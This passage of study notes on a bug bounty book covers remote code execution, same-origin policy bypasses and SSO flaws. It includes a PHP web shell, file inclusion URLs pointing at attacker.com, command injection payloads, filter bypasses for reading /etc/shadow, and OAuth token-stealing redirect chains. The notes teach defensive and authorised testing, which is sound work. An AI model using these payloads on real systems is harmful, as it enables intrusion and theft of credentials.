  ```

  - This code allows users to access the various pages of th website by changing the `page` parameter.
    - ex. `http://example.com/?page=index.php` or `http://example.com/?page=about.php`
  - If the app doesn't limit which file the user includes with the `page` parameter, an attacker can include a malicious .php file hosted on their server and get that page executed by the target server.
    - ex. basic malicious php file for remote code execution (basic-RCE.php):
    ```
    <?PHP
      system($_GET["cmd"])
    ?>
    ```
    - If the target loads this page on example.com, the site will evaluate the code contained in `basic-RCE.php`, located on the attacker's server.
    - ex. How you pass the command to the file through the web browser:
      `http://example.com/?page=http://attacker.com/basic-RCE.php?cmd=ls`
    - This feature is also vulnerable to SSRF and XSS.
      - It's vulnerable to SSRF because the page could load info about the local system and network.
      - Attackers could also make the page load a malicious JavaScript file and trick the user into clicking it to execute a reflected XSS attack.

- _Local file inclusion_ occurs when applications include files in an unsafe way, but the inclusion of remote files isn't allowed.

  - To exploit this, attackers need to upload a malicious file to the target machine/server and then execute it by using local file inclusion.
  - ex. A PHP file that gets the HTTP GET parameter `page` and then calls the PHP `include` function after concatenating `page` with a directory name containing the files users can load:

  ```
  <?php
    // Some PHP code
    $file = $_GET["page"];
    include "lang/".$file;

    // Some PHP code
  ?>
  ```

  - `lang/` directory contains the websites different homepages based on language.
    - ex. `http://example.com/?page=de-index.php` (German) and `http://example.com/?page=en-index.php` (English)
  - The `lang/` directory and files are located on the server at: `/var/www/html/lang/en-index.php`
    - (Not in the Book) The structure of these directories can change depending on the server:
      - Apache defaults to `/var/www/...`
      - Nginx defaults to `/var/www/html/...`
      - lighttpd defaults to `/var/www/...`
      - These directory structures can also be changed in the configuration files for the web server.
      - Knowing how these structures work and where certain information might be found can help you once you've gotten a reverse shell or creds for a system to sleuth through potentially sensitive documents for additional endpoints, credentials, sql server information, etc.
        - This is useful when you have a connection to the internal system through an unprivileged user (like `www-data`) and are going for root.
  - ex. example.com allows users to upload files of any file type, then stores them in the `/var/www/html/uploads/USERNAME` directory.
    - The attacker could upload a malicious PHP file to the uploads folder then use the ../../../ sequence to escape out of the `lang` directory and execute the malicious upload file on the target server:
      `http://example.com/?page=../../../../var/www/html/uploads/USERNAME/malicious.php`
    - When the website loads the malicious.php file, its contents will should be executed.

**Prevention**

"To prevent code injections, you should avoid inserting user input into code that gets evaluated. Also, since user input can be passed into evaluated code through files that are parsed by the application, you should treat user uploaded files as untrusted, as well as protect the integrity of existing system files that your programs execute, parse, or include."

- Avoid including files based on user input.
  - If that's not possible, disallow the inclusion of remote files and create an allowlist of local files that your programs can include.
- Limit file uploads to certain 'safe' file types and host uploaded files in a separate environment than the application's source code.
- Avoid calling system commands directly and use the programming language's system APIs instead.
  - ex. PHP has a function named `mkdir(DIRECTORY_NAME)` that can be used instead of calling `system("mkdir DIRECTORY_NAME")`
- Implement strong input validation for input passed into dangerous functions like `eval()` or `include()`
  - This is a weak defence, but something is better than nothing.
- Patch regularly and often.
  - An application's dependencies, such as open source packages and components, often introduce vulnerabilities into an application.
    - This is called a _software supply chain attack_, which is where you go after outdated or insecure dependencies instead of the application itself.
- Use a _web application firewall (WAF)_ to block suspicious traffic.
  - This can help with SQL injection and XSS as well.
- Use least privilege to ensure that if you are compromised, the attacker doesn't get full run of the system.

**Hunting for RCE's**

"Like many of the attacks we've covered thus far, RCEs have two types: classic and blind. _Classic RCEs_ are the ones in which you can read the results of the code execution in a subsequent HTTP response, whereas _blind RCEs_ occur when the malicious code is executed but the returned values of the execution do not appear in any HTTP response. Although attackers cnnot witness the results of their executions, blind RCE's are just as dangerous as classic RCEs because they can enable attackers to spawn reverse shells or exiltrate data to a remote server..."

- Commands to use when attacking linux servers: `whoami`, `sleep 5`
  - `whoami` is good to use with classic RCE attacks as it will display the name of the user e.g: `www-data`.
  - `sleep 5` is good to use with a blind RCE. If it takes 5 seconds for the response, you will know that the command was successful.

_Step 1: Gather Information About the Target_

- Find out information about the web sever, programming language, and other technologies used by the target.
  - [Chapter 5](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-5-web-hacking-reconnaissance) has information on this.

_Step 2: Identify Suspicious User Input Location_

- Take note of every direct user-input location: URL parameters, HTTP headers, body parameters, and file uploads...
  - Sometimes applications parse user-supplied files and concatenate their contents unsafely into executed code, so any input that is eventually passed into commands is something you should look for.
- Find potential file inclusion vulns by checking for input locations being used to determine filenames or paths, as well as any file-upload functionalities.

_Step 3: Submit Test Paylods_

_Python payloads:_

- `print("RCE test")`
- `"__import__('os').system('ls')"`
- `"__import__('os').system('sleep 10')"`

_PHP payloads_

- `phpinfo();`: prints local PHP configuration information.
- `<?php system("ls");?>`
- `<?php system("sleep 10");?>`

_Unix payloads_

- `;ls;`
- `| sleep 10;`
  `& sleep 10;`
  \`sleep 10;\` <- not easy to format in markdown...
  `$(sleep 10)`

- For file inclusion vulnerabilities, you should try to make the endpoint include either a remote file or a local file that you can control.
  - ex. try several forms of a URL that point to your malicious file hosted offsite:
    `http://example.com/?page=http://attacker.com/malicious.php`
    `http://example.com/?page=http:attacker.com/malicious.php`
  - ex. for local file inclusion:
    `http://example.com/?page=../uploads/malicious.php`
    `http://example.com/?page=..%2fuploads%2fmalicious.php.`

_Step 4: Confirm the Vulnerability_

- Confirm the vulnerability by executing harmless commands like `whoami`, `ls,`, and `sleep 10`.

**Escalating the Attack**

- Most companies would prefer you don't escalate RCEs because they don't want you poking around inside their systems that contain confidential information.
- In a penetration test, attackers will start to engage in privilege escalation in attempts to obtain root access.
- In a bug bounty program this is not appropriate.

  - Read the bug bounty rules to make sure you don't cross a line resulting in real legal trouble.

- Create _Proof of Concepts (POCs)_ that execute a harmless command like `whoami`, `ls`, that read the `/etc/password` file using the `cat` command, or create a file with the `touch` command that identifies you and says you've used an RCE to drop the file (`touch rce_by_YOUR_NAME`).
  - the `/etc/passwd` file doesn't contain actual passwords, it contains the system's accounts, user IDs, group IDs, home directories, and default shells.
- For blind RCE's create a POC that executes the sleep command and show the subsequent response with it's delay matching that of the sleep command. If it's allowed, you could demonstrate a reverse shell instead.

**Bypassing RCE Protection**

- Basic input validation bypasses you can try if the app is blocking your payloads:
  - The following will all print the `/etc/shadow` files contents:
  - `cat /etc/shadow`
  - `cat "/e"tc'/shadow'`
  - `cat /etc/sh*dow`
  - cat /etc/sha``dow
  - `cat /etc/sha$()dow`
  - `cat /etc/sha${}dow`
- Vary the way you write the command in PHP. PHP allows you to concatenate function names as strings. You can even hex-encode function names, or insert PHP comments in commands without changing their outcome:
  - `('sys'.'tem')('cat /etc/shadow');`
  - `system/**/('ls');`
    - `/* Text inside these slash asterix are comments */`
  - `\x73\x79\x73\x74\x65\x6d'('ls');`
- The following are all equivalent in python syntax:
  - `__import__('os').systen('cat /etc/shadow')`
  - `__import__('o'+'s').system('cat /etc/shadow')`
  - `__import__('\x6f\x73').system('cat /etc/shadow')`
- Some servers concatenate the values of multiple parameters that have the same name into a single value. If this is the case, you can split malicious code into chunks to bypass input validation.
  - ex. The firewall blocks requests that contain the string `system`:
  ```
  GET /calculator?calc="__import__('os').sy"&calc="stem('ls')"
  Host: example.com
  ```
  - The parameters will get through the firewall without issue since the request technically doesn't contain the string `system`.
- If you want more examples, the book suggests searching online for RCE filter bypass or WAF bypass.

**Finding Your First RCE!**

1. Identify suspicious user-input locations. For code injections, take note of every user-input location, including URL parameters, HTTP headers, Body parameters, and file uploads. To find potential file inclusion vulnerabilities, check for input locations being used to determine or construct filenames and for file-upload functions.
2. Submit test payloads to the input locations in order to detect potential vulnerabilities.
3. If your requests are blocked, try protection-bypass techniques and see if your payload succeeds.
4. Finally, confirm the vulnerability by trying to execute harmless commands such as `whoami`, `ls`, and `sleep 10`.
5. Avoid reading sensitive system files or altering any files with the vulnerability you've found.
6. Submit your first RCE report to the program.

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Chapter 19: Same-Origin Policy Vulnerabilities

"...The \[Same Origin Policy] (SOP) restricts how a script originating from one site can interact with the resources of a different site, and it's critical in preventing many common web vulnerabilities... Websites often loosen the SOP in order to have more flexibility. These controlled and intended SOP bypasses can have adverse effects, as attackers can sometimes exploit misconfigurations in these techniques to bypass the SOP. These exploits can cause private information leaks and often lead to more vulnerabilities, such as authentication bypass, account takeover, and large data breaches."

**Mechanisms**

- How an SOP works:
  - A script from page A can access data from page B only if the pages are on the same origin.
  - Two URLs are said to have the _same origin_ if they share the same protocol, hostname, and port number.
- Modern web apps often base their authentication on HTTP cookies, and server take action based on the cookies included automatically by the browser.
  - This makes the SOP especially important.
  - When SOP is implemented, malicious web pages won't be able to take advantage of the cookies stored in your browser to access your private information.
- The SOP is often too restrictive for modern web apps because they have multiple subdomains, or multiple domains and these different domains and subdomains wouldn't be able to share information if they followed the policy.

  - Because the SOP is inflexible, most websites find ways to relax it, and this is where they become vulnerable.

- ex. You find out that `a.example.com passes` information to `b.example.com` via SOP bypass techniques.
  - if you can find out the technique used and exploit it, you might be able to steal the victim's private information on the banking site.
  - The simplest way for websites to work around the SOP is to change the origin of a page via JavaScript. This is done by setting the origin of two pages to the same domain using `document.domain` in the pages' JavaScript as this will enable the pages to share resources.
  - You can set the domain of both `a.example.com` and `b.example.com` so that they can interact:
    `document.domain = "example.com"`
    - You can only set the `document.domain` of a page to a superdomain.
      - You can set `a.example.com` to `example.com`, but not `example2.com`.

_Exploiting Cross-Origin Resource Sharing_

- Many sites use Cross-Origin Resource Sharing (CORS) to relax the SOP instead.
  - CORS allows servers to explicitly specify a list of origins that are allowed to access its resources via the HTTP response header `Access-Control-Allow-Origin`.
- ex. We want to send the following JSON blob located at `a.example.com/user_info` to `b.example.com`.
  `{"username": "vickieli", "account_numer": "12345"}`
  - Under the SOP, this won't work because the source and destination are different under the SOP.
  - Using CORS, the user's browser will send an `Origin` header on behalf of `b.example.com`:
    `Origin: https://b.example.com`
  - If `b.example.com` is part of an allowlist of URLs with permission to access resources on `a.example.com`, `a.example.com` will send the browser the requested resource along with an `Access-Control-Allow-Origin` header:
    `Access-Control-Allow-Origin: https://b.example.com`
  - The application can also return the `Access-Control-Allow-Origin` header with a wildcard (\*) to indicate that the resource on that page can be accessed by any origin.
    -If the origin of the requesting page isn't allowed to access the resource, the user's browser will block the rquesting page from reading the data.
- CORS is great, but it is only safe when the list of allowed origins is properly defined.
  - If CORS is misconfigured, attackers can exploit the misconfiguration and access the protected resources.
- The most basic misconfiguration of CORS involves allowing the `null` origin.
  - If the server sets `Access-Control-Allow-Origin` to `null`, the browser will allow any site with a `null` origin header to access the resource.
  - Any origin can create a request with a `null` origin, for instance, a cross-origin request generated from a document using the `data:` URL scheme will have a null origin.
- Another common misconfiguration is to set the `Access-Control-Allow-Origin` header to the origin of the requesting page without validating the requester's origin.
  - If the server doesn't validate the origin and returns an `Access-Control-Allow-Origin` for any origin, the header will completely bypass the SOP, removing all limitations on cross-origin communication.
    `Access-Control-Allow-Origin: null`
    `Access-Control-Allow-Origin: https://attacker.com`
- Weak regexes that validate origins can also lead to vulnerabilities.
  - If the policy checks only if an origin URL starts with `www.example.com`, an attacker can bypass the filter by using an origin like `www.example.com.attacker.com`
- If you set the `Access-Control-Allow-Origin: *` and a client sends a request with credentials to the page, the browser (client) will raise an error and won't allow the client to read the response.
- Protects against CORS misconfigurations by creating a well defined CORS policy with strict allowlist and robust URL validation.
  - For pages containing sensitive information, the server should return the requesting page's origin in the `Access-Control-Allow-Origin` header only if that origin is in the allowlist. For public information, the server can simply use the wildcard designation for `Access-Control-Allow-Origin`.

_Exploiting postMessage()_

- Sites can use `postMessage()` to work around SOP.
- This method is a web API that uses JavaScript syntax and is used to send messages to another window:
  `RECIPIENT_WINDOW.postMessage(MESSAGE_TO_SEND, TARGET_ORIGIN);`
- The receiving window handles the message by using an event handler that will be triggered when the receiving window receives a message:
  `window.adEventListener("message",EVENT_HANDLER_FUNCTION);`
- `postMessage()` requires the sender to obtain a reference to the receiver's window so messages can only be sent between a widnwo and its iframes or pop-ups.
  - This is because only windows that open each other will have a way to reference each other.
  - A window can use `window.open` to refer to a new window it opened.
  - It can also user `window.opener` to reference the window that spawned the current window.
  - It can use `window.frames` to reference embedded iframes, and `window.parent` to reference the parent window of the current iframe.
- Say we're trying to pass the following JSON blob located at `a.example.com/user_info` to `b.example.com`
  `{'username': 'vickieli', 'account_number': '12345'}`
  - `a.example.com` can open `b.example.com` and send a message to its window. The `window.open()` function opens the window of a particular URL and returns a reference to it:
  ```
  var recipient_window = window.open("https://b.example.com", b_domain)
  recipient_window.postMessage("{'username': 'vikieli', 'account_number': '12345'}", "*");
  ```
  - At the same time, `b.example.com` would set up an event listener to process the data is receives:
  ```
  function parse_data(event) {
    // Prase the data
  }
  window.addEventListener("message", parse_data);
  ```
  - `postMessage()` does not bypass SOP directly but provides a way for pages of different origins to send data to each other.
  - For this to be secure, both the sender and the receiver of the message should verify the origin of the other side.
    - Vulns occur when pages enforce weak origin checks or lack origin checks altogether.
- If the sender page doesn't specify a target origin and uses a wildcard target origin instead, it becomes possible to leak information to other sites:
  `RECIPIENT_WINDOW.postMessage(MESSAGE_TO_SEND, *);`
  - In this case, an attacker can create a malicious HTML page that listens for events coming from the sender page. They can then trick users into triggering the `postMessage()` by using a malicious link or fake image and make the victim page send data to the attacker's page.
    - To prevent this, devs should always set the `TARGET_ORIGIN` parameter to the target site's URL instead of using a wildcard origin.
    ```
    recipient_window.postMessage(
    "{'username': 'vickieli', 'account_number': '12345'}", "https://b.example.com");
    ```
- On the other hand, if the message receiver doesn't validate the page where the `postMessage()` is coming from, it becomes possible for attackers to send arbitrary data to the website and trigger unwanted actions on the victim's behalf.

  - If `b.example.com` allows `a.example.com` to trigger a password change based on a `postMessage()` like this:

  ```
  recipient_window.postMessage(
  "{'action': 'password_change'< 'username': 'vickieli', 'new_password': 'password'}", "https://b.example.com");
  ```

  - The page `b.example.com` would then receive the message and process the request:

  ```
  function parse_data(event) {
    // if "action" is "password_change", change the user's password
  }
  window.addEventListener("message", parse_data);
  ```

  - Notice that a window can send messages to `b.example.com`, so any page can initiate a password change on `b.example.com`!
  - To exploit this, the attack can embed or open the victim page to obtain its window reference, then they're free to send arbitrary messages to that window.
  - To prevent this, pages should verify the origin of the sender of a message before processing it:

  ```
  function parse_data(event) {
    if (event.origin == "https://a.example.com"){

      // If "action" is "password_change", change the user's password
    }
  }
  window.addEventListener("message", parse_data);
  ```

_Exploiting JSON with Padding_

"_JSON with Padding (JSONP)_ is another technique that works around the SOP. It allows the sender to send JSOn data as JavaScript code. A page of a different origin can read the JSOn data by processing the JavaScript."

- Continuing the example from before of trying to pass a JSON blob from `a.example.com/user_info` to `b.example.com`:
- The SOP allows the HTML `<script>` tag to load scripts across origins, so an easy way for `b.example.com` to retrieve data across origins is to load the data as a script in a `<script>` tag:
  `<script src="https://a.example.com/user_info"></script>`

  - `b.example.com` would essnetially be including the JSON data block in a script tag, but this would cause a syntax error because JSON data is not valid Javascript.
  - JSON works around this issue by wrapping the data in a JavaScript function and sending the data as JavaScript code instead of a JSON file.
  - The requesting page includes the resource as a script and specifies a callback function, typically in a URL parameter name `callback` or `jsonp`.
  - This callback function is a predefined function on the receiving page ready to process the data:
    `script src="https://a.example.com/user_info?callback=parseinfo"></script>`
  - The page at `a.example.com` will returnt he data wrapped in the specified callback function:
    `parseinfo({"username": "vickieli", "account_number": "12345"})`
  - The receiving page would essentially be including this script, which is valid JavaScript code:

  ```
  <script>
    parseinfo({"username": "vickieli", "account_number": "12345"})
  </script>
  ```

  - The receiving page can then extract the data by running the JavaScript code and processing the `parseinfo()` function. By sending data as scripts instead of JSON data, JSONP allows resources to be read across origins.
  - Summary:
    1. The data requester includes the data's URL in a script tag, along with the name of a callback function.
    2. The data provider returns the JSON data wrapped within the specified callback function.
    3. The data requester receives the function and processes the data by running the returned JavaScript code.

- Find out if a site uses JSONP by looking for script tags that include URLs with the terms `jsonp` or `callback`.
- JSONP comes with risks, when it;s enabled on an endpoint, an attacker can simply embed the same script tag on their site and request th data wrapped in the JSONP payload:
  `<script src="https://a.example.com/user_info?callback=parseinfo"></script>`
  - If a user is browsing the attacker's site while logged into `a.example.com` at the same time, the user's browser will include their credentials in the request and allow attackers to extract confidential data belonging to the victim.
  - Because of this JSONP is only suitable for transmitting public data.
    - You could secure it further with CSRF tokens or an allowlist of referrer headers for JSONP requests, but they may be able to be bypassed.
  - With JSONP, site `b.example.com` need to trust site `a.example.com` completely, as it's running arbitrary JavaScript from `a.example.com`. That includes trusting it to never be compromised.
  - Sites more often use CORS than they do JSONP.

_Bypassing SOP by Using XSS_

- XXS is essentially a full SOP bypass because any JavaScript run on a page operates under the security context of that page.

**Hunting for SOP Bypasses**

_Step 1: Determine If SOP Relaxation Techniques are Used_

- When you're browsing the web app, open your proxy and look for any signs of cross-origin communication.
  - For example, CORS sites will often return HTTP responses that contain an `Access-Control-Allow-Origin` header.
  - A site could be using `postMessage()` if you inspect a page (for example, right-clicking it in Chrome and choosing **Inspect**, then navigating to **Event Listeners**) and find a `message` event listener.
  - A site could be using JSONP if you see a URL being loaded in a `<script>` tag with a callback function:
    `<script src="https://a.example.com/user_info?callback=parseinfo"></script>`
    `<script src="https://a.example.com/user-info?jsonp=parseinfo"></script>`

_Step 2: Find CORS Misconfiguration_

- Check whether the `Access-Control-Allow-Origin` response header is set to null.
- If not, send a request to the site with the origin header `https://attacker.com` with your proxy, and see if the `Access-Control-Allow-Origin` in the response is set to `https://attacker.com`
- Test whether the site properly validates the origin URL by submitting an Origin header that contains an allowed site, such as `https://www.example.com.attacker.com` then check if the `Access-Control-Allow-Origin` header returns the origin of the attacker's domain.

_Step 3: Find postMessage Bugs_

- If the site uses `postMessage`, see if you can send or receive messages as an untrusted site.

  - Create an HTML page with an iframe that frames the targeted page accepting messages.
  - Try to send messages to that page that trigger a state-changing behavior.
  - If the target cannot be framed, open it as a new window instead:

  ```
  var recipient_window = window.open("https://TARGET_URL", target_domain)
  recipient_window.postMessage("RANDOM MESSAGE", "*");
  ```

  - Create an HTML page that listens for events coming from the target page, and trigger the postMessage from the target site. See if you can receive sensitive data from the target page.

  ```
  var recipient_window = window.open("https://TARGET_URL", target_domain)

  function parse_data(event) {
    // Run some code if we receive data from the target
  }
  window.addEventListener("message", parse_data);
  ```

_Step 4: Find JSONP issues_

- If the site uses JSONP, see if you can embed a srcipt tag on your site and request the sensitive data wrapped in the JSONP payload:
  `<script src="https://TARGET_URL?callback=parseinfo"></script>`

_Step 5: Consider Mitigating Factors_

"When the target site does not rely on cookies for authentication, these SOP bypass misconfigurations might not be exploitable. For instance, when the site sues custom headers or secret request parameters to authenticate requests, you might need to find a way to forge those to exfiltrate sensitive data."

**Escalating the Attack**

- SOP bypass bugs are often already considered high severity because you can access users private information or execute actions as other users.
- Consider the following if you want to escalate further:
  - Can you harvest large amounts of user data by automating the exploitation of the SOP bypass?
  - Can you use the information you've harvested to cause more damage?
  - Can you extract security questions?
  - Consider the impact of the issue before sending the report.
    - For instance, if a publicly readable page is served with a null `Access-Control-Allow-Origin` header, it would not cause damage since it doesnt contain any sensitive information.
  - A good SOP-bypass report will include potential attack scenarios and indicate how attackers can exploit the vulnerability.
    - What data can the attacker steal, and how easy would it be?

**Finding Your First SOP Bypass Vulnerability**

1. Find out if the application uses any SOP relaxation techniques. Is the application using CORS, `postMessage`, or JSONP?
2. If the site is using CORS, test the strength of the CORS allowlist by submitting test `Origin` headers.
3. If the site is using `postMessage`, see if you can snd or receive messages as an untrusted site.
4. If the site is using JSONP, try to embed a script tag on your site and request the sensitive data wrapped in the JSONP payload.
5. Determine the sensitivity of the information you can steal using the vulnerability, and see if you can do something more.
6. Submit it!

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Chapter 20: Single-Sign-On Security Issues

"Single sign-on (SSO) is a feature that allows users to access multiple services belonging to the same organization without logging in multiple times. Once you've logged into a website that uses SSO, you won't have to enter your credentials again when accessing another service or resource belonging to the same company. For example, if you're logged into _facebook.com_, you won't have to reenter your credentials to use _messenger.com_, a Facebook service... In this chapter, we'll talk about three methods developers use to implement SSO, as well as some vulnerabilities related to each approach."

**Mechanisms**

Three most common ways of implementing SSO:

- Cookie Sharing
- SAML
- 0Auth

#### Cookie Sharing

- SSO is easy to implement if the services that need shares authentication are located under the same parent domain.
  - ex. web and mobile versions of Facebook: *www.facebook.com* and _m.facebook.com_
  - These apps can share cookies across subdomains.

_How Cookie Sharing Works_

- Modern browsers allow sites to share cookies across subdomains if the `Domain` flag is set to a common parent domain.
  - ex. all cookies will be sent to all subdomains of facebook with:
    `Set-Cookie: cookie=abc123; Domain=facebook.com; Secure; HttpOnly`
- If the SSO needs to be done across different domains, this approach will not work. _Facebook.com_ and _messenger.com_ can't share cookies because they don't share a common domain.
- Vulnerabilities specific to cookie sharing:
  - Stealing the session cookie through an attack like cross-site scripting.
  - Subdomain takeover vulnerabilities.

_Subdomain Takeovers_

"Subdomain takeovers occur when an attacker takes control over a company's unused domain."

- Best explained through example:
  - A company wants to host its subdomain `abc.example.com` on the GitHub page `abc_example.github.io`.
  - The company uses a DNS CNAME record to point `abc.example.com` to `abc_example.github.io` so users who try to access `adc.example.com` are redirected to the GitHub hosted page.
  - If the GitHub site is deleted and no one remembers to remove the CNAME record that points to it, that CNAME record becomes a _dangling_ CNAME.
    - This means anyone who can register the deleted site `abc_example.github.io` will be able to control the company's subdomain.
- Subdomain takeovers allow hackers to launch phishing campaigns from the old subdomain as well as host malicious websites on the deleted subdomain.
  - If the victim has already logged into `example.com` at least once and visits the malicious `abc.example.com` the attacker can steal their cookies with a malicious script and then would be able to login as that user across all `example.com` subdomains.
    - If the user deletes cookies after closing their browser, they would have to be logged in for their browser to be able to send the correct cookies.
- "Because the compromise of a single subdomain can mean a total compromise of the entire SSO system, using shared cookies as an SSo mechanism greatly widens the attack surface for each service."

#### Security Assertion Markup Language (SAML)

- SAML is an XML-based markup language used to facilitate SSO on larger-scale applications.
- It enables SSO by facilitating information exchange among three parties: the **user**, the **identity provider**, and the **service provider**.

_How SAML Works_

- The **user** obtains an identity assertion from the identity provider and uses that to authenticate to the service provider.
- The **identity provider** is a server in charge of authenticating the user and passing on user information to the service provider.
- The **service provider** is the actual site the user is authenticating to.

Workflow:

1. The user tries to access a resource from the service provider.
2. The service provider makes you send a SAML request to the identity provider.
3. Once you've provided your credentials, the identity provider will send the user a SAML response.
4. The user uses the SAML response to authenticate to the service provider.

![SAML diagram](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/SAML_SSO_authentication.png)

- The SAML response contains an identity assertion that communicates your identity to the service provider.
- Could contain username, email address, or user ID.
- ex. SAML identity assertion:

```
<saml:AttributeStatement>
  <saml:Attribute Name="username">
    <saml:AttributeValue>
      user1
    </saml:AttributeValue>
  </Attribute>
</saml:AttributeStatement>
```

Note: _All the SAML messages in this chapter are highly simplified for the sake of readability. Realistic SAML messages will be longer and contain a lot more information._

_SAML Vulnerabilities_

- Because an attacker who can control the SAML response passed to the service provider can authenticate as someone else, applications need to protect the integrity of their SAML messages.
  - This is usually done through using a signature to sign the message.
  - SAML can be secure if SAML signature is implemented correctly.
- SAML is insecure if an attacker can find a way to bypass the signature validation and forge the identity assertion to assume the identity of the SAML assertion to assume the identity of others.
  - If an attacker can change the embedded username in a SAML assertion, they can log in as another user.
- The digital signature that is usually applied to SAML messages ensure that no one can tamper with them, if a SAML message has the wrong signature, it won't be accepted.
- ex.

```
<saml:Signature>
  <saml:SignatureValue>
    dXNlcje=
  </saml:SignatureValue>
</saml:Signature>
<saml:AttributeStatement>
  <saml:Attribute Name="username">
    <saml:AttributeValue>
      user1
    </samlAttributeValue>
  </saml:Attribute>
</saml:attributeStatement>
```

- `dXNlcje=` is the signature.

- Sometimes the SAML signature isn't implemented or verified at all.
  - In this case, attackers can forge the identity information in the SAML response at will.
- Developers may make the mistake of verifying signatures only if they exist.
  - Attackers can then empty the signature field or remove the field completely to bypass the security.
- If the signing mechanism used to generate signatures is weak or easily predictable, attackers can forge signatures.
  - In the above SAML message, the signature `dXNlcje=` is simply base64 encoded "user1".
  - Knowing this, we could assume the identity of any user that we know the username for by simply base64 encoding the username to generate the accepted signature.
- Encryption alone will not provide adequate security for the SAML messages.
  - Encryption protects confidentiality, not integrity.
  - An attacker can tamper with the encrypted message to mess with the outcome of the identity assertion.
  - Learn more about encryption attacks [here](https://en.wikipedia.org/wiki/Encryption#Attacks_and_countermeasures)
- If SAML messages contain sensitive user info, like passwords, and they aren't encrypted, an attacker may be able to intercept the victim's traffic and steal sensitive information.
- SAML can be used as a vector for smuggling malicious input onto a site.
  - If a field in a SAML message is passed into a database an attacker could pollute the field to achieve SQL injection, XSS, or XXE.
- For SAML to be secure, it needs to have encryption and signing properly enabled and all SAML messages should be sanitized and checked for malicious user input.

#### OAuth

"OAuth is essentially a way for users to grant scope-specific access tokens to service providers through an identity provider. The identity provider manages credentials and user information in a single place, and allows users to log in by supplying service providers with information about the user's identity."

**How 0Auth Works**

- The service provider requests access to your information from the identity provider.
  - Includes thinks like email address, contacts, birthdate, etc.
  - These permissions and pieces of data are called _scope_.
  - The identity provider (IdP) will then create a unique `access_token` that the service provider uses to obtain the resources defined in the scope.
- Workflow:
  1. User logs into the service provider via OAuth
  2. The service provider will send a request for `authorization` to the IdP.
  - This includes the service provider's `client_id` used to identify the service provider.
  - A `redirect_uri` used to redirect the authentication flow.
  - A `scope` listing the requested permissions.
  - And, a `state` parameter, which is essentially a CSRF token.
  ```
  identity.com/oauth?
  client_id=CLIENT_ID
  &Response_type=code
  &state=STATE
  &redirect_uri=https://example.com/callback
  &scope=email
  ```
  3. The identity provider will then ask the user to grant access to the service provider, typically in a pop-up window.
  4. After the user agrees to the permissions the service provider asks for, the IdP will send the `redirect` an authorization code:
     `https://example.com/callback?authorization_code=abc123&state=STATE`
  5. The service provider can then obtain an `access_token` from the identity provider by using the authorization code, along with their client ID and secret.
  - Client ID's and client secrets authenticate the service provider to the identity provider:
  ```
  identity.com/oauth/token?
  client_id=CLIENT_ID
  &client_secret=CLIENT_SECRET
  &redirect_uri=https://example.com/callback
  &code=abc123
  ```
  6. The IdP then sends back the `access_token` which is used to access the user's information:
     `https://example.com/callback?#access_token=xyz123`
- A service provider might initiate a request to the identity provider for an access token to access the user's email.
  - Then it could use the email retrieved from the identity provider as proof of the user's identity to log the user in to the account registered with the same email address.

_OAuth Vulnerabilities_

- Attackers can bypass OAuth by stealing critical OAuth tokens through open redirects.
  - This is done by manipulating the `redirect_uri` parameter to steal the `access_token` from the victim's account.
  - `redirect_uri` determines where the identity provider sends critical pieces of information like the `access_token`.
  - Most major IdPs require service providers to specify an allowlist of URLs to use as the `redirect_uri`.
    - If the `redirect_uri` provided in a request isn't on the allowlist, the identity provider will reject the request.
  - The following would be rejected if only _example.com_ subdomains are allowed:
  ```
  client_id=CLIENT_ID
  &response_type=code
  &state=STATE
  &redirect_uri=https://attacker.com
  &scope=email
  ```
- `access_token`s are communicated via a URL fragment, which survives all cross-domain redirects (typically).
  - If an attacker can make the OAuth flow redirect to the attacker's domain, the attacker can steal the `access-token` from the URL fragment and gain access to the user account.
- ex. The following URL is the `redirect_uri`:
  `redirect_uri-https://example.com/callback?next=attacker.com`
  - This causes the flow to redirect to the callback URL first:
    `https://example.com/callback?next=attacker.com#access_token=xyz123`
  - And then to the attacker's domain:
    `https://attacker.com#access_token=xyz123`
  - The attacker can then send the victim a crafted URL that will initiate the OAuth flow, and run a listener on their server to harvest the leaked tokens:
  ```
  identity.com/oauth?
  client_id=CLIENT_ID
  &response_type=code
  &state=STATE
  &redirect_uri=https://example.com/callback?next=attacker.com
  &scope=email
  ```
- Another way of redirecting OAuth flow is through a referer-based open redirect. To accomplish this, the attacker would need to set up the referer header by initiating the OAuth flow from their domain:
  `<a href="https://example.com/login_via_facebook">Click here to log in to example.com</a>`
  - This causes the flow to redirect to the callback URL first:
    `https://example.com/callback?#access_token=xyz123`
  - Then it redirects to the attacker's domain via the referer:
    `https://attacker.com#access_token=xyz123`
- Attackers can still smuggle tokens offsite if they can't find an open redirect on the OAuth endpoint if they can find an _open redirect chain_.
  - If the `redirect_uri` parameter permits only redirects to the URLs that are under the _example.com_ domain, if attackers can find an open redirect within that domain, they can steal OAuth tokens via redirects.
  - ex. An open redirect on the logout endpoint of example.com exists:
    `https://example.com/logout?next=attacker.com`
  - An attacker can form a chain of redirects to eventually smuggle tokens offsite, starting with:
    `redirect_uri=https://example.com/callback?next=example.com/logout?next=attacker.com`
  - This `redirects_uri` will first cause the flow to redirect to the callback URL:
    `https://example.com/callback?next=example/logout?next=attacker.com#access_token=xyz123`
  - Then to the logout URL vulnerable to open redirect:
    `https://example.comlogout?next=attacker.com#access_token=xyz123`
  - Then it will redirect to the attacker's domain. (The attacker can harvest the access tokens via their server logs.)
    `https://attacker.com#access_token=xyz123`
- Long-lived tokens that don't expire are also a major OAuth vulnerability. Sometimes tokens aren't invalidated periodically and can be used by attackers long after they are stolen, and remain valid even after password reset.
  - Test for these by using the same access tokens after logout and after password reset.

**Hunting for Subdomain Takeovers**

"The best way to reliable discover subdomain takeovers is to build a system that monitors a company's subdomains for takeovers... let's [first\] look at how you can search for subdomains takeovers manually."

_Step 1: List the Target's Subdomains_

- This can be done by using tools mentioned in [Chapter 5](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-5-web-hacking-reconnaissance). Use a screenshot application like EyeWitness or Snapper to see what is hosted on each subdomain.

_Step 2: Finding Unregistered Pages_

- Look through you snapshots for 404 error pages to confirm possible _dangling CNAMEs_.
- Some providers employ measures to verify the identity of users, to prevent people from registering pages associated with the CNAME records.
